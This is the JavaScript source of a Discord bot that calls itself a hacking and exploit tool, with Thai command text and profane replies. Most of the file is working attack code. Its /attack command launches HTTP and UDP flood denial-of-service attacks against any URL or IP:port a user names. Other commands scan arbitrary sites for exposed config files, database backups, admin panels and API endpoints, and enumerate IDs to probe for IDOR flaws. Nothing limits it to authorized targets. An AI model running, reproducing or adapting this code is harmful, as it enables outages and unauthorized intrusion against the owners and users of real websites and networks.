/**
 * ============================================================================
 * JEFF FUJI - ULTIMATE HACKING & EXPLOIT DISCORD BOT v5 (API/IDOR ENGINE)
 * Developed under JARVIS x ARI Protocol
 * ============================================================================
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const http = require('http');
const https = require('https');
const dgram = require('dgram');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let isAttacking = false;
let attackTimers = [];

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000, rejectUnauthorized: false });

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder()
            .setName('attack')
            .setDescription('ยิงถล่มเป้าหมาย (L7 HTTP หรือ L4 UDP Flood)')
            .addStringOption(option => 
                option.setName('type')
                    .setDescription('เลือกโหมดการยิง')
                    .setRequired(true)
                    .addChoices(
                        { name: '🌐 L7 (HTTP/HTTPS Flood)', value: 'l7' },
                        { name: '⚡ L4 (UDP Network Flood)', value: 'l4' }
                    ))
            .addStringOption(option => 
                option.setName('target')
                    .setDescription('URL (สำหรับ L7) หรือ IP:Port (สำหรับ L4)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('duration')
                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('scan')
            .setDescription('สแกนหาไฟล์ลับและช่องโหว่เบื้องต้นของเว็บไซต์ (Recon)')
            .addStringOption(option => 
                option.setName('url')
                    .setDescription('URL เป้าหมาย (เช่น https://example.com)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('api-scan')
            .setDescription('สแกนหาไฟล์ API หรือ Endpoint ที่อาจรั่วไหล (เช่น .json, /api/)')
            .addStringOption(option => 
                option.setName('url')
                    .setDescription('URL เป้าหมาย')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('idor-check')
            .setDescription('ทดสอบสุ่ม ID ออเดอร์หรือโปรไฟล์เพื่อเช็คช่องโหว่ IDOR')
            .addStringOption(option => 
                option.setName('url')
                    .setDescription('URL ที่มีพารามิเตอร์ไอดี (เช่น https://site.com/user?id=100)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('start_id')
                    .setDescription('เลขไอดีเริ่มต้น')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('count')
                    .setDescription('จำนวนรอบที่จะสุ่ม (สูงสุด 10 รอบ)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('stop')
            .setDescription('หยุดการกระทำทั้งหมดทันที')
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('[+] Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[+] Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'attack') {
        const attackType = interaction.options.getString('type');
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (isAttacking) {
            return interaction.reply({ content: '⚠️ กำลังมียุทธการอื่นทำงานอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
        }

        isAttacking = true;
        const endTime = Date.now() + (duration * 1000);

        if (attackType === 'l7') {
            try {
                const parsedUrl = new URL(target);
                const requester = parsedUrl.protocol === 'https:' ? https : http;
                const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;

                await interaction.reply(`🚀 **[L7 HTTP FLOOD]** เริ่มซัด **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

                const fireL7 = () => {
                    if (!isAttacking || Date.now() >= endTime) return;

                    const options = {
                        hostname: parsedUrl.hostname,
                        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                        path: parsedUrl.pathname + parsedUrl.search,
                        method: 'GET',
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Connection': 'keep-alive'
                        },
                        agent: currentAgent
                    };

                    const req = requester.request(options, (res) => {
                        res.on('data', () => {});
                        res.on('end', () => { if (isAttacking) setImmediate(fireL7); });
                    });

                    req.on('error', () => { if (isAttacking) setImmediate(fireL7); });
                    req.end();
                };

                for (let i = 0; i < 300; i++) {
                    fireL7();
                }

            } catch (err) {
                isAttacking = false;
                return interaction.reply({ content: `❌ URL ผิดรูปแบบ: ${err.message}`, ephemeral: true });
            }

        } else if (attackType === 'l4') {
            const parts = target.split(':');
            if (parts.length !== 2) {
                isAttacking = false;
                return interaction.reply({ content: '❌ รูปแบบ L4 ต้องเป็น IP:Port เท่านั้น (เช่น 123.45.67.89:80)', ephemeral: true });
            }

            const host = parts[0];
            const port = parseInt(parts[1]);

            await interaction.reply(`🔥 **[L4 NETWORK FLOOD]** เริ่มระเบิดท่อใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

            const payload = Buffer.alloc(1024);
            for (let i = 0; i < 200; i++) {
                const clientUdp = dgram.createSocket('udp4');
                const sendUdp = () => {
                    if (!isAttacking || Date.now() >= endTime) {
                        clientUdp.close();
                        return;
                    }
                    clientUdp.send(payload, port, host, () => {
                        setImmediate(sendUdp);
                    });
                };
                sendUdp();
            }
        }

        const timer = setTimeout(() => {
            isAttacking = false;
            interaction.followUp(`✅ ภารกิจถล่ม **${target}** เสร็จสิ้นตามเวลาที่กำหนด!`).catch(() => {});
        }, duration * 1000);

        attackTimers.push(timer);

    } else if (commandName === 'scan') {
        const targetUrl = interaction.options.getString('url');
        await interaction.reply(`🔍 กำลังทำ Recon สแกนหาไฟล์ลับและช่องโหว่ของ **${targetUrl}** รอแป๊บไอ้สัส...`);

        const paths = ['/admin', '/login.php', '/config.env', '/backup.sql', '/phpmyadmin', '/robots.txt', '/wp-login.php', '/server-status'];
        let foundResults = [];

        try {
            const parsedBase = new URL(targetUrl);
            let checkedCount = 0;

            paths.forEach((p) => {
                const testUrl = `${parsedBase.protocol}//${parsedBase.host}${p}`;
                const reqLib = parsedBase.protocol === 'https:' ? https : http;

                const req = reqLib.get(testUrl, (res) => {
                    checkedCount++;
                    if (res.statusCode === 200 || res.statusCode === 403) {
                        foundResults.push(`✅ พบจุดน่าสนใจ: \`${testUrl}\` (Status: ${res.statusCode})`);
                    }
                    if (checkedCount === paths.length) {
                        sendScanResults();
                    }
                });

                req.on('error', () => {
                    checkedCount++;
                    if (checkedCount === paths.length) {
                        sendScanResults();
                    }
                });
                req.end();
            });

            async function sendScanResults() {
                const embed = new EmbedBuilder()
                    .setTitle('🛡️ Recon & Vulnerability Report')
                    .setColor(foundResults.length > 0 ? 0x22c55e : 0xef4444)
                    .setDescription(foundResults.length > 0 ? foundResults.join('\n') : '❌ ไม่พบไฟล์ลับหรือจุดอ่อนในรายการทดสอบพื้นฐาน')
                    .setTimestamp();

                await interaction.followUp({ embeds: [embed] });
            }

        } catch (err) {
            await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
        }

    } else if (commandName === 'api-scan') {
        const targetUrl = interaction.options.getString('url');
        await interaction.reply(`📡 กำลังสแกนหา API Endpoints ที่อาจรั่วไหลของ **${targetUrl}**...`);

        const apiPaths = ['/api/v1/users', '/api/products', '/products.json', '/api/auth/session', '/wp-json/wp/v2/users', '/api/v1/admin'];
        let foundApi = [];

        try {
            const parsedBase = new URL(targetUrl);
            let count = 0;

            apiPaths.forEach((p) => {
                const testUrl = `${parsedBase.protocol}//${parsedBase.host}${p}`;
                const reqLib = parsedBase.protocol === 'https:' ? https : http;

                const req = reqLib.get(testUrl, (res) => {
                    count++;
                    if (res.statusCode === 200) {
                        foundApi.push(`🎯 **API Leak Found:** \`${testUrl}\` (Status: 200 OK)`);
                    }
                    if (count === apiPaths.length) {
                        sendApiResults();
                    }
                });

                req.on('error', () => {
                    count++;
                    if (count === apiPaths.length) {
                        sendApiResults();
                    }
                });
                req.end();
            });

            async function sendApiResults() {
                const embed = new EmbedBuilder()
                    .setTitle('⚡ API & Data Leak Scan Report')
                    .setColor(foundApi.length > 0 ? 0x22c55e : 0xef4444)
                    .setDescription(foundApi.length > 0 ? foundApi.join('\n') : '❌ ไม่พบ API ที่เปิดสาธารณะในรายการทดสอบ')
                    .setTimestamp();

                await interaction.followUp({ embeds: [embed] });
            }

        } catch (err) {
            await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
        }

    } else if (commandName === 'idor-check') {
        const targetUrl = interaction.options.getString('url');
        const startId = interaction.options.getInteger('start_id');
        const count = Math.min(interaction.options.getInteger('count'), 10); // จำกัดไม่เกิน 10 รอบเพื่อความปลอดภัย

        await interaction.reply(`🔍 กำลังทดสอบ IDOR สุ่มตรวจสอบไอดีตั้งแต่ **${startId}** ถึง **${startId + count - 1}**...`);

        let idorResults = [];
        try {
            const parsedUrl = new URL(targetUrl);
            let checked = 0;

            for (let i = 0; i < count; i++) {
                const currentId = startId + i;
                // แทนที่ค่าไอดีใน URL (สมมติว่ามี id=...)
                const testUrl = targetUrl.replace(/id=\d+/, `id=${currentId}`);
                const reqLib = parsedUrl.protocol === 'https:' ? https : http;

                const req = reqLib.get(testUrl, (res) => {
                    checked++;
                    if (res.statusCode === 200) {
                        idorResults.push(`⚠️ **IDOR Potential:** \`${testUrl}\` responded with 200 OK`);
                    }
                    if (checked === count) {
                        sendIdorResults();
                    }
                });

                req.on('error', () => {
                    checked++;
                    if (checked === count) {
                        sendIdorResults();
                    }
                });
                req.end();
            }

            async function sendIdorResults() {
                const embed = new EmbedBuilder()
                    .setTitle('🔓 IDOR Vulnerability Test Report')
                    .setColor(idorResults.length > 0 ? 0xf59e0b : 0x22c55e)
                    .setDescription(idorResults.length > 0 ? idorResults.join('\n') : '✅ ไม่มีพารามิเตอร์ไอดีที่ตอบสนองผิดปกติในช่วงที่สุ่ม')
                    .setTimestamp();

                await interaction.followUp({ embeds: [embed] });
            }

        } catch (err) {
            await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
        }

    } else if (commandName === 'stop') {
        if (!isAttacking) {
            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังทำงานอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
        }

        isAttacking = false;
        attackTimers.forEach(t => clearTimeout(t));
        attackTimers = [];

        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
    }
});

client.login(TOKEN);
